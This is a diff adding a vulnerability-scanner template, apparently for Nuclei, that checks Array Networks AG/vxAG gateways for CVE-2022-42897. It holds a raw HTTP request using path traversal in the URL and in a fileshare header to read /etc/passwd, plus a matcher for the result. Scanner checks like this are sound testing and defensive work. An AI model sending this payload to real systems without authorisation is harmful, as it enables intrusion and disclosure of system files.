@@ -1,0 +1,29 @@
+id: array-vpn-rce-cve-2022-42897
+
+info:
+  name: Array Networks AG/vxAG RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Array Networks AG/vxAG with ArrayOS AG prior to 9.4.0.469 has a security vulnerability that allows an unauthenticated attacker to achieve command injection, resulting in privilege escalation and control over the system.
+  tags: code-execution,rce
+  classification:
+    cve-id: CVE-2022-42897
+    cvss-score: 9.8
+
+http:
+  - raw:
+      - |
+        GET /prx/000/http/localhost/client_sec/../addfolder HTTP/1.1
+        Host: {{Hostname}}
+        X_an_fileshare: uname=t;password=t;sp_uname=t;flags=c3248;fshare_template=../../../../../../../../../../etc/passwd
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+      - type: word
+        part: body
+        words:
+          - "AN_global_var_init"
